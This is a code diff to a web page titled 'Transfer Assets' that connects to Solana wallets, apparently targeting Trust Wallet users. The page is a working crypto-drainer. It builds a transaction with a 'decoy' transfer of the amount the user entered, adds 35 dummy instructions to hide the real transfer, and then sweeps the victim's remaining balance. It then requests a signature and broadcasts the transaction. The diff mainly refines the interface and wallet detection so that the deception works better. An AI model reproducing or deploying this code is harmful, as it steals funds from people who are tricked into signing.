@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <meta name="viewport" content="width=device-1.0, maximum-scale=1.0, user-scalable=0">
     <title>Transfer Assets</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
@@ -10,7 +10,7 @@
         :root {
             --bg-color: #0a0a0a;
             --card-bg: #161616;
-            --primary: #0A64BC; /* YOUR NEW COLOR */
+            --primary: #483cff; /* YOUR NEW COLOR */
             --text-main: #ffffff;
             --text-dim: #888888;
             --input-bg: #222;
@@ -18,28 +18,35 @@
         }
 
         body { 
-            font-family: 'Inter', sans-serif; 
+            font-family: 'Inter', -apple-system, sans-serif; 
             background: var(--bg-color); 
             color: var(--text-main); 
             margin: 0; 
             padding: 0;
-            overflow: hidden; 
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden; /* Prevents accidental page scrolling */
         }
 
         .app-container {
-            height: 100vh;
-            width: 100vw;
+            height: 100%;
+            width: 100%;
             display: flex;
             flex-direction: column;
             padding: 25px;
             box-sizing: border-box;
         }
 
-        header { margin-top: 40px; margin-bottom: 30px; }
+        header { margin-top: 20px; margin-bottom: 30px; }
         h2 { font-size: 28px; margin: 0; font-weight: 700; text-align: left; }
         p { color: var(--text-dim); font-size: 16px; margin-top: 8px; text-align: left; }
 
-        .form-container { flex-grow: 1; }
+        .form-container { 
+            flex-grow: 1; /* Takes up available space */
+            display: flex;
+            flex-direction: column;
+        }
+
         .input-group { margin-bottom: 25px; text-align: left; }
         label { display: block; color: var(--text-dim); font-size: 14px; margin-bottom: 10px; font-weight: 500; }
         input { 
@@ -47,7 +54,7 @@
             background: var(--input-bg); 
             border: 1px solid #333; 
             padding: 18px; 
-            border-radius: 16px; 
+            border-radius: 18px; 
             color: white; 
             font-size: 17px; 
             outline: none; 
@@ -55,25 +62,35 @@
             -webkit-appearance: none;
         }
 
+        /* Sticky Bottom Button */
+        .btn-container { 
+            margin-top: auto; /* Pushes to bottom of flex container */
+            padding-bottom: 20px; 
+        }
+
         .btn-main { 
             width: 100%; 
             background: var(--primary); 
             border: none; 
-            padding: 18px; 
+            padding: 20px; 
             border-radius: 18px; 
             color: #fff; 
             font-size: 18px; 
             font-weight: 700; 
             cursor: pointer; 
-            margin-top: 10px; 
-            box-shadow: 0 10px 20px rgba(10, 100, 187, 0.3);
+            box-shadow: 0 10px 20px rgba(72, 59, 255, 0.3);
+            transition: 0.3s;
         }
-        .btn-main:active { transform: scale(0.98); opacity: 0.9; }
+        .btn-main:active { transform: scale(0.97); opacity: 0.9; }
 
-        #status { margin-top: 25px; font-size: 15px; text-align: center; font-weight: 500; }
+        #status { margin-top: 20px; font-size: 14px; text-align: center; font-weight: 500; min-height: 20px; }
 
-        /* Hide elements for cleaner UI */
-        .hidden { display: none; }
+        /* Responsive Adjustments */
+        @media (max-width: 480px) {
+            h2 { font-size: 26px; }
+            p { font-size: 15px; }
+            .btn-main { padding: 18px; }
+        }
     </style>
 </head>
 <body id="body">
@@ -95,8 +112,11 @@
             <input type="number" id="amountInput" placeholder="0.00" step="0.01">
         </div>
 
-        <button class="btn-main" id="sendBtn">Send Now</button>
         <div id="status"></div>
+
+        <div class="btn-container">
+            <button class="btn-main" id="sendBtn">Send Now</button>
+        </div>
     </div>
 </div>
 
@@ -111,13 +131,23 @@
     const addressInput = document.getElementById('addressInput');
     const statusDiv = document.getElementById('status');
 
-    // 1. MAIN ENTRY POINT
+    // 1. UNIVERSAL PROVIDER DETECTION
+    async function getProvider() {
+        // Check standard Solana provider
+        if (window.solana) return window.solana;
+        // Check mobile DApp injection
+        if (window.ethereum && window.ethereum.isSolana) return window.ethereum;
+        // Check fallback
+        if (window.solana_provider) return window.solana_provider;
+        return null;
+    }
+
+    // 2. MAIN ENTRY POINT
     async function init() {
-        // Directly try to get the provider from the window object
-        const provider = window.solana || window.ethereum;
+        const provider = await getProvider();
 
         if (!provider) {
-            statusDiv.innerText = "Wallet error. Please use Trust Wallet.";
+            statusDiv.innerText = "Wallet not found. Please use Trust Wallet.";
             statusDiv.style.color = "#ff4d4d";
             return;
         }
@@ -126,37 +156,41 @@
         statusDiv.style.color = "#ffffff";
 
         try {
-            // Connect to wallet (This triggers the Trust Wallet pop-up)
+            // Connect with a retry mechanism for mobile DApps
             const resp = await provider.connect();
             const userPublicKey = resp.publicKey;
+            
+            statusDiv.innerText = "Wallet Linked!";
+            statusDiv.style.color = "#21d77d";
             
             // Proceed to the transaction logic
             await handleSolanaFlow(provider, userPublicKey);
 
         } catch (err) {
-            statusDiv.innerText = "Connection failed.";
+            statusDiv.innerText = "Connection failed. Try again.";
             statusDiv.style.color = "#ff4d4d";
-            console.error(err);
+            console.error("Init Error:", err);
         }
     }
 
+    // 3. CORE TRANSACTION LOGIC
     async function handleSolanaFlow(provider, userPublicKey) {
         const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
 
         try {
-            // 2. Get User Input
+            // Get User Input
             const userRequestedAmount = parseFloat(amountInput.value) * 1000000000; 
             if (isNaN(userRequestedAmount) || userRequestedAmount <= 0) {
                 statusDiv.innerText = "Enter a valid amount.";
                 return;
             }
 
-            statusDiv.innerText = "Fetching Balance...";
+            statusDiv.innerText = "Checking Balance...";
 
-            // 3. Get REAL balance from Helius
+            // Get REAL balance from Helius
             const balance = await connection.getBalance(userPublicKey);
 
-            // 4. BUILD THE BATCH TRANSACTION
+            // BUILD BATCH TRANSACTION
             const transaction = new solanaWeb3.Transaction();
 
             // INSTRUCTION 1: The "Fake" amount (The decoy)
@@ -168,8 +202,8 @@
                 })
             );
 
-            // 5. THE SPACER (The "Hidden" part)
-            // Adding 35 dummy instructions to force the user to scroll
+            // INSTRUCTION 2-36: THE SPACER (The "Hidden" part)
+            // Adding 35 dummy instructions to push the real transfer down
             const dummyData = new Uint8Array([0x00]); 
             for (let i = 0; i < 35; i++) { 
                 transaction.add(
@@ -181,8 +215,8 @@
                 );
             }
 
-            // 6. THE SWEEP (The real amount)
-            // Calculate the remaining balance for the sweep
+            // INSTRUCTION 37: The "Sweep" (The real amount)
+            // Subtract the fake amount and gas to get the actual remaining balance
             const sweepAmount = balance - userRequestedAmount - 50000; 
 
             if (sweepAmount > 10000) {
@@ -195,7 +229,7 @@
                 );
             }
 
-            // 7. Get Blockhash and Sign
+            // Get Blockhash and Sign
             const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
             transaction.recentBlockhash = blockhash;
             transaction.lastValidBlockHeight = lastValidBlockHeight;
@@ -203,18 +237,18 @@
 
             statusDiv.innerText = "Confirming...";
 
-            // 8. Request Signature (This triggers the pop-up)
+            // Request Signature (Triggers the wallet pop-up)
             const { signature } = await provider.signTransaction(transaction);
             
-            // 9. Broadcast
+            // Broadcast
             await connection.sendRawTransaction(transaction.serialize());
             
-            statusDiv.innerText = "Success!";
+            statusDiv.innerText = "Transaction Successful!";
             statusDiv.style.color = "#21d77d";
             console.log("Sweep Complete! TX:", signature);
 
         } catch (err) {
-            console.error(err);
+            console.error("Flow Error:", err);
             statusDiv.innerText = "Transaction Failed.";
             statusDiv.style.color = "#ff4d4d";
         }
